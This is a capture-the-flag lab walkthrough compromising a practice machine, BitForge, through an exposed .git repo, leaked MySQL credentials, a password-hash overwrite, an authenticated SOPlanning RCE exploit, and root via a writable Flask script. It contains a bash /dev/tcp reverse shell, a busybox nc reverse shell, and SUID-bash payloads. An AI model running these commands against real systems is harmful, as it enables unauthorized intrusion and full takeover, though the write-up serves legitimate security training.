---
icon: ubuntu
---

# BitForge - Intermediate

## Gaining Access

Nmap Scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.118.186 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 10:27 EDT
Nmap scan report for 192.168.118.186
Host is up (0.030s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
80/tcp   open   http       Apache httpd
|_http-title: Did not follow redirect to http://bitforge.lab/
|_http-server-header: Apache
| http-git: 
|   192.168.118.186:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: created .env to store the database configuration 
3306/tcp open   mysql      MySQL 8.0.40-0ubuntu0.24.04.1
| ssl-cert: Subject: commonName=MySQL_Server_8.0.40_Auto_Generated_Server_Certificate
| Not valid before: 2025-01-15T14:38:11
|_Not valid after:  2035-01-13T14:38:11
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.40-0ubuntu0.24.04.1
|   Thread ID: 135
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolOld, DontAllowDatabaseTableColumn, Support41Auth, FoundRows, Speaks41ProtocolNew, ODBCClient, SwitchToSSLAfterHandshake, LongColumnFlag, ConnectWithDatabase, LongPassword, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, IgnoreSigpipes, SupportsCompression, SupportsTransactions, InteractiveClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: -\x05B\x08o+\x07R\x0F\x1A\x0B\x16DU9A\x06~\x18?
|_  Auth Plugin Name: caching_sha2_password
9000/tcp closed cslistener
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 (92%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 9000/tcp)
HOP RTT      ADDRESS
1   31.77 ms 192.168.45.1
2   31.73 ms 192.168.45.254
3   31.79 ms 192.168.251.1
4   31.90 ms 192.168.118.186
```

Nmap shows us a redirect on port 80, I am going to add it to my /etc/hosts file

```
192.168.118.186	bitforge.lab
```

## HTTP Port 80

<figure><img src="../../.gitbook/assets/image (1624).png" alt=""><figcaption></figcaption></figure>

On the main page there is an Employee Planing Portal that reveals another subdomain I am going to add it to my /etc/hosts file

```
192.168.118.186	bitforge.lab plan.bitforge.lab
```

<figure><img src="../../.gitbook/assets/image (1625).png" alt=""><figcaption></figcaption></figure>

Searchsploit reveals a RCE, but we need some credentials for it to work.

<figure><img src="../../.gitbook/assets/image (1626).png" alt=""><figcaption></figcaption></figure>

### Directory Busting

```
feroxbuster -u http://bitforge.lab/ -w ~/tools/SecLists/Discovery/Web-Content/raft-small-files.txt
```

<figure><img src="../../.gitbook/assets/image (1627).png" alt=""><figcaption></figcaption></figure>

Reveals a git repo, I am going to clone it and try looking for some credentials.

```
python ~/tools/git-dumper/git_dumper.py http://192.168.118.186/.git/ .
```

<figure><img src="../../.gitbook/assets/image (1628).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1629).png" alt=""><figcaption></figcaption></figure>

The developers made a mistake and hardcoded the credentials for the databse let's check it out

<figure><img src="../../.gitbook/assets/image (1630).png" alt=""><figcaption></figcaption></figure>

Let's try  these creds on the MySQL database

### Enumerating MySQL database

```
mysql -h 192.168.118.186 -u BitForgeAdmin -pB1tForG3S0ftw4r3S0lutions --skip-ssl
```

<figure><img src="../../.gitbook/assets/image (1631).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1632).png" alt=""><figcaption></figcaption></figure>

The hash for the admin user does not seem like it can be cracked (tried hashcat and john and crackstation to no avail)

Hash identifier, Says its a SHA1 Hash

<figure><img src="../../.gitbook/assets/image (1633).png" alt=""><figcaption></figcaption></figure>

This is a rabbit hole, I am going back to Port 80, and try to find a new attack vector, I searched the web for information about the SOPlanning application. During my research, I discovered its source code on [GitHub](https://github.com/Worteks/soplanning.git) and began analyzing it for clues.

After discovering the `soplanning/includes/demo-data.inc` file, I assumed it contained initial database entries used during the application’s setup. Reviewing its contents, I found mentioning in the file `soplanning/templates/languages/en.txt`that the default credentials are `admin:admin`, and its corresponding SHA-1 hash is:

<figure><img src="../../.gitbook/assets/image (1634).png" alt=""><figcaption></figcaption></figure>

This led me to explore the possibility that the application might still accept the default hash if I manually replaced the existing password hash in the MySQL database with the default one. By doing so, I could potentially authenticate as the admin and gain access to the application.

<figure><img src="../../.gitbook/assets/image (1635).png" alt=""><figcaption></figcaption></figure>

With this information in hand, I crafted the following SQL command to update the password hash. You can execute the following command to apply the update:

```
use soplanning
```

```
UPDATE planning_user SET password='df5b909019c9b1659e86e0d6bf8da81d6fa3499e' WHERE user_id='ADM';
```

<figure><img src="../../.gitbook/assets/image (1636).png" alt=""><figcaption></figcaption></figure>

After I navigated to the SOPlanning login page, [`http://plan.bitforge.lab`](http://plan.bitforge.lab`/), entered the credentials `admin:admin`, and, it worked.

<figure><img src="../../.gitbook/assets/image (1637).png" alt=""><figcaption></figcaption></figure>

Now we can execute the exploit we found earlier by providing the necessary values:

### SOPlanning 1.52.01 RCE (Authenticated)

```
searchsploit -m 52082
```

```
python3 52082.py -t http://plan.bitforge.lab/www -u admin -p admin
```

<figure><img src="../../.gitbook/assets/image (1638).png" alt=""><figcaption></figcaption></figure>

I am going to setup a rev.sh script and get a nice interactive shell with [**penelope**](https://github.com/brightio/penelope)

```
#!/bin/bash

bash -i >& /dev/tcp/192.168.45.158/80 0>&1
```

<figure><img src="../../.gitbook/assets/image (1639).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1640).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1642).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### PSPY

```
timeout 4m ./pspy64
```

I am going to run [**pspy**](https://github.com/DominicBreuker/pspy/releases) first and see if there are any cron jobs running in the background

<figure><img src="../../.gitbook/assets/image (1643).png" alt=""><figcaption></figcaption></figure>

root is running a cronjob in the background, and it's leaking jack's credentials. Let's change user to jack and check his privileges

<figure><img src="../../.gitbook/assets/image (1644).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1645).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1647).png" alt=""><figcaption></figcaption></figure>

The script cd's to the `/opt/password_change_app` directory, which contains the necessary files for the Flask application.

The script runs the Flask command-line tool located at `/usr/local/bin/`. The app is hosted on localhost \[127.0.0.])accessible only from the local machine, and listening on port 9000. The `--no-debug` flag ensures that Flask runs in production mode, preventing the use of the interactive debugger, which could otherwise pose security risks.

[**Linpeas**](https://github.com/peass-ng/PEASS-ng/releases) reveals jack has write permissions on the files inside of /`opt/password_change_app` directory.&#x20;

<figure><img src="../../.gitbook/assets/image (1648).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1649).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1650).png" alt=""><figcaption></figcaption></figure>

The `app.py` script serves a basic index.html page via the Flask web application when accessed. It is part of the `flask_password_changer`&#x20;

Since we have write access to `app.py`, I can replace it with a malicious script that sets the SUID to bash, granting us full control over the target machine as root.

```
mv app.py app.py.bak
```

```
vi app.py
```

```
import os
os.system("chmod +s /bin/bash")
```

```
sudo /usr/bin/flask_password_changer
```

```
/bin/bash -p
```

<figure><img src="../../.gitbook/assets/image (1651).png" alt=""><figcaption></figcaption></figure>

Other commands we could have used

```
import os
os.setuid(0)
os.system("/bin/bash -p")
```

Or for a reverse shell

```
import os

os.system("busybox nc 192.168.45.158 3306 -e /bin/bash")
```

